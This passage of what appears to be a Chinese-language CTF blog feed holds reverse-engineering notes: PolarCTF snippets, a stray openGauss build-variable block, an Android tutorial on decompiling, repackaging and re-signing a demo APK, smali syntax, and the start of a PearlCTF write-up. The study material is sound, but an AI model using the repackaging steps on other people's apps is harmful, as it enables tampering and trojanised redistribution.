class="number">0</span>;input[i];++i)&#123;</span><br><span class="line">       <span class="keyword">if</span> ( ch_0 &lt;= <span class="number">96</span> || ch_0 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ch_0 &gt; <span class="number">64</span> &amp;&amp; ch_0 &lt;= <span class="number">90</span> )</span><br><span class="line">        ch_0 = (ch_0 - <span class="number">65</span> + key+<span class="number">26</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ch_0 = (ch_0 - <span class="number">97</span> - key+<span class="number">26</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result[i]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="易位"><a href="#易位" class="headerlink" title="易位"></a>易位</h3><p>太抽象了，，用这边的解密那边的字符，用那边的解密这边的字符</p><h3 id="C"><a href="#C" class="headerlink" title="C^"></a>C^</h3><p>好像也是异或1，简单的</p><h3 id="一个flag截三段"><a href="#一个flag截三段" class="headerlink" title="一个flag截三段"></a>一个flag截三段</h3><p>字面意思，打开IDA</p><p>（我看wp似乎是pe文件损坏修复？</p><p>export CODE_BASE&#x3D;&#x2F;home&#x2F;dblab&#x2F;opengauss-compile&#x2F;openGauss-server-v3.0.0 # Path of the openGauss-server file</p><p>export BINARYLIBS&#x3D;$CODE_BASE&#x2F;..&#x2F;binarylibs-v3.0.0</p><p>export GAUSSHOME&#x3D;$CODE_BASE&#x2F;dest</p><p>export GCC_PATH&#x3D;$BINARYLIBS&#x2F;buildtools&#x2F;openeuler_aarch64&#x2F;gcc7.3</p><p>export CC&#x3D;$GCC_PATH&#x2F;gcc&#x2F;bin&#x2F;gcc</p><p>export CXX&#x3D;$GCC_PATH&#x2F;gcc&#x2F;bin&#x2F;g++</p><p>export D_LIBRARY_PATH&#x3D;$GAUSSHOME&#x2F;lib:$GCC_PATH&#x2F;gcc&#x2F;lib64:$GCC_PATH&#x2F;isl&#x2F;lib:$GCC_PATH&#x2F;mpc&#x2F;lib&#x2F;:$GCC_PATH&#x2F;mpfr&#x2F;lib&#x2F;:$GCC_PATH&#x2F;gmp&#x2F;lib&#x2F;:$LD_LIBRARY_PATH</p><p>export PATH&#x3D;$GAUSSHOME&#x2F;bin:$GCC_PATH&#x2F;gcc&#x2F;bin:$PATH</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PolarCTF&quot;&gt;&lt;a href=&quot;#PolarCTF&quot; class=&quot;headerlink&quot; title=&quot;PolarCTF&quot;&gt;&lt;/a&gt;PolarCTF&lt;/h1&gt;&lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/18/Android%E9%80%86%E5%90%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/18/Android%E9%80%86%E5%90%91/</id>
    <published>2024-03-17T16:00:00.000Z</published>
    <updated>2024-09-16T07:14:09.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android逆向"><a href="#Android逆向" class="headerlink" title="Android逆向"></a>Android逆向</h1><h2 id="Android基础知识"><a href="#Android基础知识" class="headerlink" title="Android基础知识"></a>Android基础知识</h2><h3 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h3><p>安卓（Android）是一种基于Linux内核（不包含GNU组件）的自由及开放源代码的操作系统。主要使用于移动设备，如智能手机和平板电脑，由美国Google公司和开放手机联盟领导及开发。</p><p>android框架：<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240307112450236.png" alt="image-20240307112450236"></p><p> 从下往上分别是：Linux内核层、系统运行库层（程序库+android运行库）、应用程序框架层、应用层。</p><p><strong>Linux内核层：</strong> Android 系统是基于 Linux 内核的,它提供了基本的系统功能及与硬件交互的驱动，像图中Display Driver（显示驱动）、Camera Driver（摄像头驱动）、WiFi Driver（WiFi驱动）等</p><p><strong>系统运行库层：</strong> 像图中内核的上一层就是系统运行库层，程序库（绿色部分） 和 Android运行库（黄色部分） 组成。</p><ul><li><p>Libraries（程序库）： 由 C、C++ 编写，一系列程序库的集合，供 Android 系统的各个组件使用。</p></li><li><p>Android runtime（Core Librares + Dalvik虚拟机）： 翻译过来就是 Android 运行时，Android 应用程序时采用 Java 语言编写，程序在Android运行时中执行，其运行时分为核心库 和 Dalvik虚拟机 两部分。</p></li></ul><p><strong>Application Framework（应用程序框架层）</strong>： 这一层主要是提供一些组件，搭建框架，方便app 开发人用再次基础上快速开发开发应用程序。而实际上就是一些 Android API。</p><p><strong>Applications（应用层</strong>）：顶层中有所有的 Android 应用程序，如手机中的：电话、文件管理、信息等。</p><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a><strong>虚拟机</strong></h3><h4 id="Dalvik-虚拟机"><a href="#Dalvik-虚拟机" class="headerlink" title="Dalvik 虚拟机"></a><strong>Dalvik</strong> <strong>虚拟机</strong></h4><p>Dalvik 是 google 专门为 Android 操作系统设计的一个虚拟机，简称DVM<strong>。</strong>在 Android 4.4及以前的版本， 所有的 Android 程序都是在 Dalvik 虚拟机环境下去运行的。DVM 的指令是<strong>基于寄存器</strong>的，运行的是经过转换的 <strong>.dex****文件</strong> （.dex 是专为 Dalvik 设计的一种压缩格式，适合内存和处理器速度有限的系统），Dalvik 虚拟机每次应用运行的时候，将代码编译成机器语言执行。</p><h4 id="ART-虚拟机"><a href="#ART-虚拟机" class="headerlink" title="ART 虚拟机"></a><strong>ART</strong> <strong>虚拟机</strong></h4><p>前面说到，当我们使用手机每运行一个程序，Dalvik 虚拟机都会产生一个实例，互不影响，这就可能会出现占用资源过多等问题，随着人们日益增长的需求，Dalvik 无法满足人们对软件运行效率的需要。这是就诞生了 ART 虚拟机。</p><p>在 <strong>Android4.4</strong> <strong>及以上版本</strong>，应运而生的 ART 虚拟机替代了 Dalvik 虚拟机，其处理机制根本上的区别是它采用AOT(Ahead of TIme) 技术，<strong>会在应用程序安装时就转换成机器语言，不再在执行时解释</strong>，从而优化了应用运行的速度。在内存管理方面，ART 也有比较大的改进，对内存分配和回收都做了算法优化，降低了内存碎片化程度，回收时间也得以缩短。</p><p><strong>DVM</strong> <strong>与</strong> <strong>ART</strong> <strong>的区别：</strong> 虽说 ART 替换了 Dalvik 虚拟机，并不意味着，其应用程序开发上也要发生改变，像 android 应用程序安装包（apk）中，仍然还是可执行的 .dex 文件。</p><h3 id="Apk-编译流程"><a href="#Apk-编译流程" class="headerlink" title="Apk 编译流程"></a><strong>Apk</strong> <strong>编译流程</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240307124845628.png" alt="image-20240307124845628"></p><h3 id="正向开发"><a href="#正向开发" class="headerlink" title="正向开发"></a><strong>正向开发</strong></h3><p>首先我们来写一个 app，并打包成 apk。在这个过程中，我们可以接触到很多安卓逆向中会遇到的概</p><p>念。</p><p>一个 app 可以理解为由三个基本元件构成：</p><ol><li><p>AndroidManifest.xml：可以想成是 app 的配置文件</p></li><li><p>resources：各种资源，包括排版、代码中出现的字符串、图片等</p></li><li><p>代码：UI 界面及逻辑代码</p></li></ol><p>下面是一个简单的 demo，左边是项目树，右边是 AndroidManifest.xml 的內容：</p><p>从这个配置文件，我们可以知道：</p><ol><li><p>这个 app 的包名（package name）是 com.example.demo</p></li><li><p>这个 app 里有一个窗体（activity），名字为 MainActivity ，是程序入口窗体</p></li></ol><p>什么是 activity 呢？你可以把 activity 理解成是一个界面，每个程序界面对应一个 activity。假设 app是个需要注册才能使用的应用，则可能有以下界面：</p><ul><li><p>欢迎界面</p></li><li><p>注册界面</p></li><li><p>登录界面</p></li><li><p>主界面</p></li></ul><p>而这每一个界面都是一个 activity，而每一个 activity 可能都有一个 layout。在 Android 开发中，layout 其实就是一个 xml 文档，像这样：</p><p>像 layout 就属于资源文件的一种，会被放到 res 文件夹下。</p><p>上图中有两点需要注意，一是 android:id&#x3D;”@+id&#x2F;textview_first” 代表这个组件对应到一个 id。才能在代码里通过 id 拿到这个组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TextView tv = (TextView) findViewById(R.id.textview_first);</span><br><span class="line"></span><br><span class="line">tv.setText(&quot;hello&quot;);</span><br></pre></td></tr></table></figure><p>第二个值得注意的地方是 android:text&#x3D;”@string&#x2F;hello_first_fragment” ，这其实就是组件会显示的文字，对应到 res&#x2F;values&#x2F;strings.xml ：</p><p>利用这样的方法，我们可以避免直接在 layout 里写死字符串，这样就可以做成支持多国语言的 app。</p><p><strong>拆包与重打包</strong></p><p>上面的程序编译成 apk 后，我们可以把它的后缀改成 .zip 直接解压，得到这样的目录结构：</p><ul><li><p>META-INF：存放签名文件</p></li><li><p>res：资源文件</p></li><li><p>AndroidManifest.xml：app 配置文件</p></li><li><p>classes.dex：Java 代码编译成 dex 文件</p></li><li><p>resources.arsc：资源文件相关的索引表</p></li></ul><p>java -jar apktool.jar d -f demo.apk</p><p>修改 res&#x2F;values&#x2F;strings.xml 里的 hello_first_fragment 为 Hacked ，再重打包：</p><p>java -jar apktool.jar b –use-aapt2 demo -o demo2.apk</p><p>此时的 apk 还无法安装，我们需要对它进行 align 和 sign 才能在手机上安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v -p <span class="number">4</span> demo2.apk demo2-aligned.apk</span><br><span class="line"></span><br><span class="line">keytool -genkey -v -keystore my-key.jks -keyalg RSA -keysize <span class="number">2048</span> -validity</span><br><span class="line"><span class="number">10000</span> -alias my-alias</span><br><span class="line"></span><br><span class="line">apksigner sign --ks my-key.jks --ks-pass pass:<span class="number">123456</span> --out demo2-signed.apk</span><br><span class="line">demo2-aligned.apk</span><br></pre></td></tr></table></figure><h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><p>JNI（Java Native Interface）是一种在 Java 虚拟机中调用本地（Native）方法的机制。在 Android中，由于 Android 应用是通过 Java 语言编写的，但是某些操作系统底层的功能只能通过本地 C&#x2F;C++ 代码来实现，所以需要使用 JNI 来实现Java与本地代码的交互。</p><p>使用 JNI 可以让 Java 程序调用本地库中的函数，而本地函数可以使用标准 C&#x2F;C++ 编写。这样可以通过JNI 将 Java 程序与本地代码组合在一起。</p><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a><strong>常用工具</strong></h3><ul><li><p>adb</p></li><li><p>apksigner</p></li><li><p>Android killer</p></li><li><p>jadx</p></li><li><p>jeb</p></li></ul><h2 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h2><h3 id="Java-gt-smali"><a href="#Java-gt-smali" class="headerlink" title="Java -&gt; smali"></a><strong>Java -&gt; smali</strong></h3><p>smali 文件是怎么得到的呢？</p><ol><li><p>通过 javac 把 .java 编译成 .class</p></li><li><p>通过 dx 把 .class 转化为 .dex</p></li><li><p>通过 baksmali 把 .dex 转为 smali</p></li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java</span><br><span class="line">dx --dex --output=Test.dex Test.class</span><br><span class="line">java -jar baksmali.jar d Test.dex</span><br></pre></td></tr></table></figure><h3 id="Dalvik-寄存器"><a href="#Dalvik-寄存器" class="headerlink" title="Dalvik 寄存器"></a><strong>Dalvik</strong> <strong>寄存器</strong></h3><p>Dalvik中 的寄存器都是 32 位大小，支持所有类型。对于小于或等于 32 位类型，使用一个寄存器就可</p><p>以了，对 64 位（long 和 double) 类型，需要使用两个相邻的寄存器来存储。</p><p><strong>寄存器的命名法有两种：****V</strong> <strong>命名法和</strong> <strong>P</strong> <strong>命名法：</strong></p><p> v 命名法：局部变量寄存器 V0-Vn，参数寄存器是 Vn-V(n+m)。</p><p> p 命名法：参数寄存器 P0-Pn，变量寄存器 V0-Vn。</p><h4 id="v-命名法"><a href="#v-命名法" class="headerlink" title="v 命名法"></a><strong>v</strong> <strong>命名法</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308224545382.png" alt="image-20240308224545382"></p><p>v0-v2 表示的是局部变量寄存器，v3-v4 表示的参数寄存器。在例一中第一个方框里可以看到 v2 是局部寄存器， v3 是参数寄存器。在图中第二个方框里可以看到 v0 是局部寄存器，v4 是参数寄存器。</p><h4 id="p-命名法"><a href="#p-命名法" class="headerlink" title="p 命名法"></a><strong>p</strong> <strong>命名法</strong></h4><p>p 命名法针对参数寄存器进行了优化，参数寄存器的命名从 p0 开始，使得局部变量寄存器和参数寄存器得以很容易的进行区分。smali 语法中就是用了 p 命名法。我们来看下 add() 方法的 smali 代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.method <span class="keyword">public</span> <span class="title function_">add</span><span class="params">(II)</span>I</span><br><span class="line">.registers <span class="number">4</span></span><br><span class="line">.param p1, <span class="string">&quot;a&quot;</span> # I</span><br><span class="line">.param p2, <span class="string">&quot;b&quot;</span> # I</span><br><span class="line">.prologue</span><br><span class="line">.line <span class="number">6</span></span><br><span class="line">add-<span class="type">int</span> v0, p1, p2</span><br><span class="line">.line <span class="number">7</span></span><br><span class="line">.local v0, <span class="string">&quot;c&quot;</span>:I</span><br><span class="line"><span class="keyword">return</span> v0</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>这样就很清晰了，4 个寄存器命名如下所示：</p><ul><li><p>v0 局部变量寄存器，存储 a+b 的值</p></li><li><p>p0 当前引用 this</p></li><li><p>p1 参数寄存器，存储 a 的值</p></li><li><p>p2 参数寄存器，存储 b 的值</p></li></ul><h3 id="Dalvik-描述符"><a href="#Dalvik-描述符" class="headerlink" title="Dalvik 描述符"></a><strong>Dalvik</strong> <strong>描述符</strong></h3><p>在更深入的了解 Dalvik 字节码前，先来看一下 Dalvik 是如何描述字段和方法的，这也有助于我们阅读smali 代码。</p><h4 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a><strong>类型描述符</strong></h4><p>Dalvik 字节码中只有两种类型，基本类型和引用类型。除了对象和数组以外，其他的所有 Java 类型都是基本类型。这和 JVM 的类型描述符是基本一致的。基本类型都是使用单个字母来表示。数组类型使用[ 表示。除数组以外的引用类型使用 L 加上全限定名表示。如下表所示：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308224712573.png" alt="image-20240308224712573"></p><p>举一个引用类型的例子。例如 String 对象，其全限定名是 java&#x2F;lang&#x2F;String; ，在 Dalvik 中就表示为 Ljava&#x2F;lang&#x2F;String; 。对于数组，又可以分为基本类型数组和引用类型数组，其格式都是 [ 加上类型描述符。 int[] 就是 [I ， String[] 就是 [java&#x2F;lang&#x2F;String; 。多维数组就是多个 [ ，例如int[][] 就是 [[I 。</p><h4 id="字段"><a href="#字段" class="headerlink" title="字段"></a><strong>字段</strong></h4><p>Dalvik 表示字段的格式：<strong>类型（包名＋类名）＋字段名称＋字段类型</strong></p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lpackage/name/ObjectName;-&gt;FieldName:Ljava/lang/String;</span><br></pre></td></tr></table></figure><p>Lpackage&#x2F;name&#x2F;ObjectName; 是当前这个字段所在的类，其中，L 是 java类类型， package&#x2F;name&#x2F;是包名， ObjectName 是类名。</p><p>FieldName 是字段名称， Ljava&#x2F;lang&#x2F;String; 是字段类型。字段名称和字段类型之间要用 : 隔</p><p>开。</p><p>其他例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Landroid/content/pm/ActivityInfo;-&gt;theme:I</span><br><span class="line">Lorg/cocos2dx/lua/AppActivity;-&gt;handler:Landroid/os/Handler;</span><br></pre></td></tr></table></figure><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a><strong>方法</strong></h4><p>Dalvik 方法的表现形式：<strong>类型（包名＋类名）＋方法名（＋参数类型）＋返回值类型</strong></p><p>例如：Lpackage&#x2F;name&#x2F;ObjectName;-&gt;MethodName (III) Z</p><p>MethodName 是方法名， (III) Z 是方法的签名信息，由方法参数列表(III)和返回值(Z)构成，(III)表示三个 int 型参数；Z 表示返回值类型为 boolean。</p><p>其他例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Lcom/test/Test;-&gt;add(II)I</span><br><span class="line">Landroid/os/Handler;-&gt;&lt;init&gt;()V</span><br><span class="line">Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V</span><br></pre></td></tr></table></figure><h3 id="Dalvik-指令集"><a href="#Dalvik-指令集" class="headerlink" title="Dalvik 指令集"></a><strong>Dalvik</strong> <strong>指令集</strong></h3><p>参考资料：Dalvik opcodes</p><p>有了上面的知识储备之后，就可以具体的学习 Dalvik 指令集了。</p><p>Dalvik 指令格式为：<strong>基础字节码</strong> <strong>-</strong> <strong>名称后缀</strong>**&#x2F;**<strong>字节码后缀 目的寄存器 源寄存器</strong></p><p>注：连接符号 - 在有的指令里是可以不存在的</p><p>例子：<strong>move-wide&#x2F;from16 vAA,VBBBB</strong></p><p><strong>move</strong> <strong>为基础字节码</strong>：即 opcode。</p><p><strong>wide</strong> <strong>为名称后缀</strong>：标识指令操作的数据宽度为 64 位。</p><p><strong>from16</strong> <strong>为字节码后缀</strong>：标识源为一个 16 位的寄存器引用变量。</p><p><strong>vAA</strong> <strong>为目的寄存器</strong>：它始终在源的前面，取值范围为 v0~v255。</p><p><strong>vBBBB</strong> <strong>为源寄存器</strong>：取值范围为 v0~v65535。</p><p>Dalvik 指令集中大多数指令用到了寄存器作为目的操作数或源操作数，其中 A&#x2F;B&#x2F;C&#x2F;D&#x2F;E&#x2F;F&#x2F;G&#x2F;H 代表一个 4 位的数值，AA&#x2F;BB&#x2F;…&#x2F;HH 代表一个 8 位的数值，AAAA&#x2F;BBBB&#x2F;…&#x2F;HHHH 代表一个 16 位的数值。</p><p>一些常见的指令。</p><h4 id="空指令"><a href="#空指令" class="headerlink" title="空指令"></a><strong>空指令</strong></h4><p>nop     空指令，通常用于对齐</p><h4 id="数据操作指令"><a href="#数据操作指令" class="headerlink" title="数据操作指令"></a><strong>数据操作指令</strong></h4><p>数据操作指令为 move。move 指令根据字节码大小与类型不同，后面会跟上不同的后缀，表达的意义也就不同。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225456588.png" alt="image-20240308225456588"></p><p>总结起来 move 指令有三种作用：</p><ul><li><p>进行赋值操作</p></li><li><p>move-result 接收返回值操作</p></li><li><p>处理异常的操作</p></li></ul><h4 id="返回指令"><a href="#返回指令" class="headerlink" title="返回指令"></a><strong>返回指令</strong></h4><p>返回指令即 return 指令，指的是函数结尾时运行的最后一条指令。共有以下四条返回指令：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225608978.png" alt="image-20240308225608978"></p><h4 id="数据定义指令"><a href="#数据定义指令" class="headerlink" title="数据定义指令"></a><strong>数据定义指令</strong></h4><p>数据定义指令用来定义程序中用到的常量，字符串，类等数据。它的基础字节码为 const</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225624563.png" alt="image-20240308225624563"></p><h4 id="类型判断指令"><a href="#类型判断指令" class="headerlink" title="类型判断指令"></a><strong>类型判断指令</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225636083.png" alt="image-20240308225636083"></p><h4 id="数组操作指令"><a href="#数组操作指令" class="headerlink" title="数组操作指令"></a><strong>数组操作指令</strong></h4><p>数组操作包括获取数组长度，新建数组，数组赋值，数组元素取值与赋值等操作。</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225648985.png" alt="image-20240308225648985"></p><p><strong>异常指令</strong></p><p>Dalvik 指令集有一条指令用来抛出异常：</p><p>throw vAA  抛出 vAA 寄存器指定的异常</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a><strong>跳转指令</strong></h4><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225717003.png" alt="image-20240308225717003"></p><h4 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a><strong>比较指令</strong></h4><p>比较指令用于对两个寄存器的值（浮点型或长整型）进行比较。</p><ul><li><p>大于(1)&#x2F;等于(0)&#x2F;小于(-1)&#x3D;&gt;cmpg、cmp</p></li><li><p>大于(-1)&#x2F;等于(0)&#x2F;小于(1)&#x3D;&gt;cmpl</p></li></ul><p>指令如下：</p><ul><li><p><strong>cmp-long vAA, vBB, vCC</strong> <strong>：</strong>比较两个长整型数。如果vBB寄存器大于vCC寄存器，则结果为1，相等则结果为0，小于则结果为-1。</p></li><li><p><strong>cmpl-float vAA, vBB, vCC****：</strong>比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。</p></li><li><p><strong>cmpl-double vAA, vBB, vCC****：</strong>比较两个双精度浮点数。如果vBB寄存器大于vCC寄存器，结果为-1，相等则结果为0，小于的话结果为1。</p></li><li><p><strong>cmpg-float vAA, vBB, vCC****：</strong>比较两个单精度浮点数。如果vBB寄存器大于vCC寄存器，结果为1，相等则结果为0，小于的话结果为-1。</p></li><li><p><strong>cmpg-double vAA, vBB, vCC****：</strong>比较两个双精度浮点数。如果vBB寄存器大于vCC寄存器，结果为1，相等则结果为0，小于的话结果为-1。</p></li></ul><h4 id="字段操作指令"><a href="#字段操作指令" class="headerlink" title="字段操作指令"></a><strong>字段操作指令</strong></h4><p>字段操作指令用来对对象实例的字段进入读写操作。字段的类型可以是 Java 中有效的数据类型，对普</p><p>通字段与静态字段操作有两中指令集。</p><ul><li><p>普通字段 &#x3D;&gt; iget读 &#x2F; iput 写</p></li><li><p>静态字段 &#x3D;&gt; sget读 &#x2F; sput 写</p></li></ul><h5 id="普通字段"><a href="#普通字段" class="headerlink" title="普通字段"></a><strong>普通字段</strong></h5><p>iinstanceop vA, vB,field@CCCC</p><p>对已标识的字段执行已确定的对象实例字段运算，并将结果加载或存储到值寄存器中</p><p>针对不同类型的普通字段，有如下指令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iget、iget-wide、iget-object、iget-<span class="type">boolean</span>、iget-<span class="type">byte</span>、iget-<span class="type">char</span>、iget-<span class="type">short</span></span><br><span class="line">iput、iput-wide、iput-object、iput-<span class="type">boolean</span>、iput-<span class="type">byte</span>、iput-<span class="type">char</span>、iput-<span class="type">short</span></span><br></pre></td></tr></table></figure><h5 id="静态字段"><a href="#静态字段" class="headerlink" title="静态字段"></a><strong>静态字段</strong></h5><p>sstaticop vAA,field@BBBB</p><p>对已标识的静态字段执行已确定的对象静态字段运算，并将结果加载或存储到值寄存器中</p><p>针对不同类型的静态字段，有如下指令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sget、sget-wide、sget-object、sget-<span class="type">boolean</span>、sget-<span class="type">byte</span>、sget-<span class="type">char</span>、sget-<span class="type">short</span></span><br><span class="line">sput、sput-wide、sput-object、sput-<span class="type">boolean</span>、sput-<span class="type">byte</span>、sput-<span class="type">char</span>、sput-<span class="type">short</span></span><br></pre></td></tr></table></figure><h4 id="方法调用指令"><a href="#方法调用指令" class="headerlink" title="方法调用指令"></a><strong>方法调用指令</strong></h4><p>方法调用指令的格式为 invoke-kind {vC, vD, vE, vF, vG}, meth@BBBB , 具体的有如下指令：</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240308225931362.png" alt="image-20240308225931362"></p><p><strong>数据转换指令</strong></p><p>数据转换指令用于将一种类型的数值转换成另一种类型。它的格式为“opcode vA, vB”，vB寄存器存放需</p><p>要转换的数据，转换后的结果保存在vA寄存器中。</p><p>常见的数据转换指令：</p><ul><li><p>**neg-**<strong>数据类型</strong>：求补</p></li><li><p>**not-**<strong>数据类型</strong>：求反</p></li><li><p>*<em>数据类型</em>***1-to-<strong><strong>数据类型</strong></strong>2**：将数据类型1转换为数据类型2</p></li></ul><h4 id="数据运算指令"><a href="#数据运算指令" class="headerlink" title="数据运算指令"></a><strong>数据运算指令</strong></h4><p>数据运算指令包括算术运算指令与逻辑运算指令。算术运算指令主要进行数值间如加、减、乘、除、</p><p>模、移位等运算，逻辑运算主要进行数值间与、或、非、异或等运算。</p><p>常见的数据运算指令：</p><ul><li><p><strong>add&#x2F;sub&#x2F;mul&#x2F;div&#x2F;rem</strong>：加&#x2F;减&#x2F;乘&#x2F;除&#x2F;模</p></li><li><p><strong>and&#x2F;or&#x2F;xor</strong>：与&#x2F;或&#x2F;异或</p></li><li><p><strong>shl&#x2F;shr&#x2F;ushr</strong>：有符号左移&#x2F;有符号右移&#x2F;无符号右移</p></li></ul><h3 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a><strong>示例分析</strong></h3><p>通过<strong>演示</strong>，让我们来看看下面的这个 Java 程序在 smali 层面是怎样实现的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">HELLO_WORLD</span> <span class="operator">=</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">System.out.println(HELLO_WORLD);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>adb shell dumpsys activity top</p><p>adb shell am start -D -n 包名&#x2F;.ui.login.LoginActivity</p><p>nkctf9233bg</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Android逆向&quot;&gt;&lt;a href=&quot;#Android逆向&quot; class=&quot;headerlink&quot; title=&quot;Android逆向&quot;&gt;&lt;/a&gt;Android逆向&lt;/h1&gt;&lt;h2 id=&quot;Android基础知识&quot;&gt;&lt;a href=&quot;#Android基础知识&quot; c</summary>
      
    
    
    
    
    <category term="RE Android" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-Android/"/>
    
  </entry>
  
  <entry>
    <title>PearlCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/15/PearlCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/15/PearlCTF/</id>
    <published>2024-03-14T16:00:00.000Z</published>
    <updated>2024-09-16T07:13:10.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PearlCTF"><a href="#PearlCTF" class="headerlink" title="PearlCTF"></a>PearlCTF</h1><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="byteme"><a href="#byteme" class="headerlink" title="byteme"></a>byteme</h3><blockquote><p>I know you are a python expert, but can you reverse this?</p><p>Author: TheAlpha</p><p><a href="https://github.com/D13David/ctf-writeups/blob/main/pearlctf24/rev/byteme/byteme.pyc"><code>byteme.pyc</code></a></p></blockquote><p>Tags: <em>rev</em></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal, dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;byteme.pyc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.seek(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(dis.dis(marshal.load(file)))</span><br></pre></td></tr></table></figure><p>This challange comes with a compiled python script. There are nice <a href="https://github.com/zrax/pycdc"><code>decompilers</code></a> for this, but they are mostly lacking support for really new python  versions. So, not surprising, the decompiler doesn’t want to work.</p><p>From the hexdump, we can see that the magic number (first four bytes are <code>0a0d0df0</code>). We can <a href="https://github.com/python/cpython/blob/5b2f21faf388d8de5b388996cfd4f03430085764/Lib/importlib/_bootstrap_external.py#L467C21-L467C25"><code>see</code></a> that this is corresponding to <code>Python 3.13a1 3568</code>. So lets grab the correct python version.</p><figure class="highlight plaintext"><table><tr><td 